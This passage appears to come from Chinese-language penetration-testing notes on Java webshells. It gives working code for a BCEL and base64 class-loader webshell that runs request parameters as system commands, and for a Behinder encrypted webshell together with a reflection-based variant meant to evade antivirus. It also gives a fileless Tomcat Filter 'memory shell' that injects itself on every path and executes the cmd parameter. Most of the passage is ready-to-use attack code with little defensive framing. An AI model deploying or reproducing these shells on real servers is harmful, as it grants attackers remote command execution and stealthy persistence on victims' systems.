    String beclcode="$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85T$5bS$d3$40$U$fe$b6M$9b$Q$c3$a5$e1Z$f1$7e$81R$KUAT$40$d4BA$a4$5c$a4$88$d3$c74$5d0$d8$a6$9d4e$f0$X$f9$aa3$da$3a2$e3$a3$P$fe$S$c7$df$e0$88g$d3r$e9X$f5$ngw$cf$ed$3b$e7$db$b3$f9$f6$eb$f3$X$A$93$d8R$d1$83$b8$8c$5b$w$7c$88$x$b8$z$d6$3b2$sdL$aa$b8$8b$v$n$ee$a9$b8$8f$H$K$a6U$c8$98Q$R$c4$ac$Q$P$V$cc$vx$q$o$k$b7$a1$hOd$qd$cc3$f8$j$5ef$d0S$7b$c6$be$R$cf$h$f6n$3c$ed$3a$96$bd$3b$c3$Q$9c$b5l$cb$9dc$e8$8d$fci$k$d9f$90$e6$8b9$ce$d0$99$b2l$beV$vd$b9$b3ed$f3$5c$a4$x$9aF$7e$dbp$yqn$u$r$f7$95EP$j$a9$c4$h$97$8b$c8$e4$be$95$t$Y$bfY$c81$b4$97$bd$bc$89$8a$95$cfq$87$n$fc$Hd$c3D$R$j$d9$ca$ce$Owxn$93$h$9e$f3$40$dd$d9$w$c6$TM$W$f2$95$f2T$i$a5O$bb$86$f9z$d5$uy$c5x$cd$_$Q$93D$k$83$9a$3c0y$c9$b5$8avYF$92Aq$8buD$86$9e$c8H$xf$d4t$b1$e2$98$7c$d1$S$7d$85$ce$f63$$$bc5$f4c$91$a1$ff$_$j0$EfK$O$9f$d3$b0$84$a7$M$7d$adk$t$K$8e$N$cbv$a9$e2R$Kn$U$ea6$Z$cb$g$9eaEC$K$ab2$d64$acc$83$98$5cJ$ac$I$ec$e7BljH$p$c6$c0T$81$X$t$40$N$a3$88i$e8E$l$83v$b6h$86$ae$d3R$d7$b3$7b$dct$9bT$c7lt$9f$U$b4$7eB$Z$a1F$c4$y$E$8dR$89$dbt$91c$ad$86$e5$l$97$Z$3a5mVl$d7$w$Q$a5$ea$$wO$O$bdMw$d0P$8b$9b$e5$H$dcd$Y$fe$P$de$86S4y$b9$dc$8c$d4P$d2$u$R$d2$Zz$e9$d2$8e$d1$9ay$a7$f0h$a4$a5$a1$f5$d3$e8$3eun$8c$a2$d0$w$U$91$T$af$FW$e9$N$f6$d0$abf$f4$d1$85$90$f4$d1$be$l$D$b4$86$e9$f4$9d$del$80$d6$X$d1$g$d8$n$7c$99$g$fc$baTE$60$f5$Q$c1$cc$n$e4$cc$t$u$a3U$b4U$a1$ea$e7j$d0jh_$h$ab$a2$p3$z$7d$85$k$L$L_$bd$93$c4$cb$b7G$3fbz$97$d8EcU$84$3eB$7fO$89$fd8Or$Im$qeHP$Q$a2$7d$Y$wb$d00$85v$q$d1I$e3$V$c2$Wt$Mz$3f$m$af$m$5c$c0E$c0$db$5d$a2$c2$89V$y$e02$aeP$e11$8cPc$d7$u$f7$E$c9$ebd$95p$83$3c$H$e1$3b$o$a3$q$e3$a6$8c$n$Z$c32$o$c0O$M$d0$89B$40nD$_$7d4$9f$qE$ffqZ$F7$81$e8$H$e8$ef$3czD$bdAO$d9$e7$d5$a3$d5$j$g$f5$d0$e0y$5e$e3$bf$B$wE$LC$_$F$A$A";
    Class<?> aClass = loader.loadClass(beclcode);
    Constructor<?> constructor = aClass.getConstructor(String.class);
    Object o = constructor.newInstance(code);
    response.getWriter().println(o);

%>
```

## 自定义类加载器

### 先本地测试

```java
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

class myload extends ClassLoader{
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        String str64= "yv66vgAAADQAVAoAFAAvBwAwCgACAC8IADEKAAIAMgcAMwcANAoANQA2CgA1ADcKADgAOQgAOgoABwA7CgAGADwKAAYAPQgAPggAPwoAAgBACQATAEEHAEIHAEMBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxCeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwBCBwBEBwAwBwAzAQAKRXhjZXB0aW9ucwcARQEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABcARgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAFPHByZT4MAEcASAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBJDABKAEsMAEwATQcATgwATwBQAQADR0JLDAAXAFEMABcAUgwAUwAsAQABCgEABTwvcHJlDAArACwMABUAFgEADEJ5dGVDb2RlRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUAIQATABQAAAABAAAAFQAWAAAAAgABABcAGAACABkAAADoAAYABQAAAFUqtwABuwACWbcAAxIEtgAFTbsABlm7AAdZuAAIK7YACbYAChILtwAMtwANTi22AA5ZOgTGABIsGQS2AAUSD7YABVen/+osEhC2AAVXKiy2ABG1ABKxAAAAAwAaAAAAJgAJAAAABwAEAAgAEQAJABkACgAsAAwANgANAEUADwBMABEAVAASABsAAAA0AAUAAABVABwAHQAAAAAAVQAeABYAAQARAEQAHwAgAAIALAApACEAIgADADMAIgAjABYABAAkAAAAGwAC/wAsAAQHACUHACYHACcHACgAAPwAGAcAJgApAAAABAABACoAAQArACwAAQAZAAAALwABAAEAAAAFKrQAErAAAAACABoAAAAGAAEAAAAWABsAAAAMAAEAAAAFABwAHQAAAAEALQAAAAIALg==";
        byte[] bytes=Base64.getDecoder().decode(str64);
        return super.defineClass(name,bytes,0,bytes.length);
    }
}


public class RunTime4 {
    public static void main(String[] args) throws Exception {
/*        byte[] bytes = Files.readAllBytes(Paths.get("D:\\javasec\\webshell123\\target\\classes\\ByteCodeEvil.class"));
        System.out.println(Base64.getEncoder().encodeToString(bytes));*/
        myload  myload= new myload();
        Class<?> aClass = myload.findClass("ByteCodeEvil");
        Constructor<?> constructor = aClass.getConstructor(String.class);
        Object obj = constructor.newInstance("ipconfig");
        System.out.println("obj = " + obj);
    }
}
```

成功执行了 ipconfig 命令

### 实战步骤

先来一个恶意类：

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ByteCodeEvil {
    String res;
    public ByteCodeEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder().append("<pre>");
        BufferedReader bufferedReader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(),"GBK"));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        stringBuilder.append("</pre");
        // 回显
        this.res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        return this.res;
    }
}
```

再把把恶意类的字节码转换成  base64 字符串

```java
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class ToBase64 {
    public static void main(String[] args) throws IOException {
      toBase64("E:\\渗透笔记\\Java\\Project\\webshell123\\target\\classes\\ByteCodeEvil.class");
    }

    public static String toBase64(String s) throws IOException {
        byte[] bytes = Files.readAllBytes(Paths.get(s));
        return Base64.getEncoder().encodeToString(bytes);
    }
}
```

⾃定义⼀个类加载器，并重写findClass()⽅法。该⽅法⽤来查找⼀个类，并在⽅法⾥调⽤defineClass() ⽅法将字节流实例化为对象

最终webshell代码：

```jsp
<%@ page import="java.util.Base64" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class myload extends ClassLoader{
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            String str64= "yv66vgAAADQAVAoAFAAvBwAwCgACAC8IADEKAAIAMgcAMwcANAoANQA2CgA1ADcKADgAOQgAOgoABwA7CgAGADwKAAYAPQgAPggAPwoAAgBACQATAEEHAEIHAEMBAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADkxCeXRlQ29kZUV2aWw7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAA1TdGFja01hcFRhYmxlBwBCBwBEBwAwBwAzAQAKRXhjZXB0aW9ucwcARQEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQARQnl0ZUNvZGVFdmlsLmphdmEMABcARgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAFPHByZT4MAEcASAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwBJDABKAEsMAEwATQcATgwATwBQAQADR0JLDAAXAFEMABcAUgwAUwAsAQABCgEABTwvcHJlDAArACwMABUAFgEADEJ5dGVDb2RlRXZpbAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAAygpVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBACooTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmc7KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUAIQATABQAAAABAAAAFQAWAAAAAgABABcAGAACABkAAADoAAYABQAAAFUqtwABuwACWbcAAxIEtgAFTbsABlm7AAdZuAAIK7YACbYAChILtwAMtwANTi22AA5ZOgTGABIsGQS2AAUSD7YABVen/+osEhC2AAVXKiy2ABG1ABKxAAAAAwAaAAAAJgAJAAAABwAEAAgAEQAJABkACgAsAAwANgANAEUADwBMABEAVAASABsAAAA0AAUAAABVABwAHQAAAAAAVQAeABYAAQARAEQAHwAgAAIALAApACEAIgADADMAIgAjABYABAAkAAAAGwAC/wAsAAQHACUHACYHACcHACgAAPwAGAcAJgApAAAABAABACoAAQArACwAAQAZAAAALwABAAEAAAAFKrQAErAAAAACABoAAAAGAAEAAAAWABsAAAAMAAEAAAAFABwAHQAAAAEALQAAAAIALg==";
            byte[] bytes= Base64.getDecoder().decode(str64);
            return super.defineClass(name,bytes,0,bytes.length);
        }
    }

%>
<%if(request.getParameter("code")!=null){
    String code=request.getParameter("code");
    myload myload= new myload();
    Class<?> aClass = myload.findClass("ByteCodeEvil");
    Constructor<?> constructor = aClass.getConstructor(String.class);
    Object obj = constructor.newInstance(code);
    response.getWriter().println(obj);
}
%>
```

## 免杀冰蝎

### 原型

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%!class U extends ClassLoader{// classloader 类加载器
  U(ClassLoader c){// 构造方法 参数为父类加载器
    super(c);
  }
  public Class g(byte []b){// g方法调用父类加载器加载类
    // defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类，并返回该类的Class对象
    return super.defineClass(b,0,b.length);
  }
}%>
<%if (request.getMethod().equals("POST"))// 校验该请求是否是POST方法
{
  // 定义一个已经加密好的密钥 改密钥是AES加密算法的密钥
  String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
  // session.putValue方法 跟session.setAttribute方法类似，但是可以设置多个值
  session.putValue("u",k);
  // Cipher是加密算法的接口，它提供了加密和解密的方法 这里是实例化一个AES加密算法的密钥
  Cipher c=Cipher.getInstance("AES");
  // c.init 方法 这里的2 跟进代码中 是解密的意思  1是加密的意思  2 是解密 参数1是密钥  参数2是加密模式 采用AES
  c.init(2,new SecretKeySpec(k.T(),"AES"));
  //
  new U(this.getClass().getClassLoader()).g(c.doFinal(request.getParameter("p").getBytes()))
          .g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))
          .newInstance().equals(pageContext);
  //将代码分解
  // U(this.getClass().getClassLoader()) 这里的this.getClass().getClassLoader()是获取当前类的类加载器
  //.g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())))
  // request.getReader().readLine() 这里的request.getReader().readLine()是获取请求的数据
  // new sun.misc.BASE64Decoder().decodeBuffer() 这里的new sun.misc.BASE64Decoder().decodeBuffer()是将请求的数据解密
  // c.doFinal() 这里的c.doFinal()是将解密后的数据进行加密 参数是解密后的数据
  // newInstance() 这里的newInstance()是将加密后的数据转换成类对象
  // .equals(pageContext) 这里的.equals(pageContext)是将类对象转换成字符串对象 并且比较两个字符串对象是否相等
}%>
```

### 免杀

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*,sun.misc.BASE64Decoder"%>
<%@ page import="java.lang.reflect.Constructor" %>
<%!class U extends ClassLoader
{
    U(ClassLoader c){super(c);
    }
    public Class g(byte []b)
    {
        return super.defineClass(b,0,b.length);
    }
}%>
<%if (request.getMethod().equals("POST"))
{
    String k="e45e329feb5d925b";
    session.putValue("u",k);
    Cipher c=Cipher.getInstance("AES");
    Class c2 = Class.forName("javax.crypto.spec.SecretKeySpec");
    Constructor Constructor=c2.getConstructor(byte[].class,String.class);
    SecretKeySpec aes =(SecretKeySpec)Constructor.newInstance(k.getBytes(),"AES");
    c.init(2,aes);
    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
    String input= request.getReader().readLine();
    byte[] bytes=(byte[]) Base64.getDecoder().decode(input);
    Class clazz2=Class.forName("javax.crypto.Cipher");
    byte[] clazzBytes=(byte[]) clazz2.getMethod("doFinal",byte[].class).invoke(c,bytes);
    Class clazz=new U(contextClassLoader).g(clazzBytes);
    clazz.newInstance().equals(pageContext);
}%>
```

# 内存马

扩展阅读
https://www.cnblogs.com/zpchcbd/p/14814385.html
https://www.freebuf.com/articles/web/274466.html
https://blog.csdn.net/angry_program/article/details/116661899

## Filter内存马

什么是内存⻢，内存⻢**即是无文件马**，只存在于内存中。我们知道常见的 WebShell 都是有一个⻚面文件存在于服务器上，然而内存⻢则不会存在文件形式。落地的JSP文件十分容易被设备给检测到，从而得到攻击路径，从而删除webshell以及修补漏洞，内存⻢也很好的解决了这个问题。

### filter前置

新建一个 filter

```java
package com.example.javaweb1;
import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter(filterName="FilterDemo",urlPatterns = {"/hello"})
public class FilterDemo implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("------------启动------------");
    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("第一个doFilter执行过滤操作");
        servletRequest.setCharacterEncoding("utf-8");
        servletResponse.setCharacterEncoding("utf-8");
        servletResponse.setContentType("text/html;charset=UTF-8");
        filterChain.doFilter(servletRequest,servletResponse);
        System.out.println(servletRequest.getParameter("cmd"));
        Runtime.getRuntime().exec(servletRequest.getParameter("cmd"));
        System.out.println(" 过滤中。。。 ");
    }

    @Override
    public void destroy() {
        System.out.println("-----------释放------------");
    }
}
```

我们访问 `http://localhost:8080/hello?cmd=calc` 时会执行 calc 命令

<img src=".\图片\Snipaste_2023-03-21_19-17-35.png" alt="Snipaste_2023-03-21_19-17-35" style="zoom:67%;" />

这种需要修改或者添加Filter文件上传到网站目录上而且容易被发现。

### Filter内存马

动态注册Filter执行内存马
主要原理是通过反射修改主要的参数。上传恶意的jsp文件网站执行。
当tomcat运行的时候内存马一直在运行，tomcat重启之后内存⻢关闭。

详细调试分析
https://blog.csdn.net/angry_program/article/details/116661899

接下来是一个jsp的内存马，此时是在 jsp 中创建了一个 Filter ，并注入到 Tomcat 中，当我们触发这个内存马后，即使这个jsp内存马被清理移除了，我们仍然可以访问任意路径触发命令执行

```jsp
<%--
  Created by IntelliJ IDEA.
  User: win7_wushiying
  Date: 2021/10/24
  Time: 19:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>


<%
    final String name = "shell";
    // 获取上下文，即standardContext
    ServletContext servletContext = request.getSession().getServletContext();

    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
    //获取上下文中 filterConfigs
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);
    //创建恶意filter
    if (filterConfigs.get(name) == null){
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {

            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
                HttpServletRequest req = (HttpServletRequest) servletRequest;
                if (req.getParameter("cmd") != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                    Scanner s = new Scanner( in ).useDelimiter("\\a");
                    String output = s.hasNext() ? s.next() : "";
                    servletResponse.getWriter().write(output);
                    servletResponse.getWriter().flush();
                    return;
                }
                filterChain.doFilter(servletRequest, servletResponse);
            }

            @Override
            public void destroy() {

            }

        };
        //创建对应的FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        /**
         * 将filterDef添加到filterDefs中
         */
        standardContext.addFilterDef(filterDef);
        //创建对应的FilterMap，并将其放在最前
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/*");
        filterMap.setFilterName(name);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());

        standardContext.addFilterMapBefore(filterMap);
        //调用反射方法，去创建filterConfig实例
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
        //将filterConfig存入filterConfigs，等待filterchain.dofilter的调用
        filterConfigs.put(name, filterConfig);
        out.print("Inject Success !");
    }
%>
<html>
<head>
    <title>Title</title>
</head>
<body>

</body>
</html>
```

<img src=".\图片\Snipaste_2023-03-21_19-22-23.png" alt="Snipaste_2023-03-21_19-22-23" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-03-21_19-22-59.png" alt="Snipaste_2023-03-21_19-22-59" style="zoom:80%;" />





















































































































































































































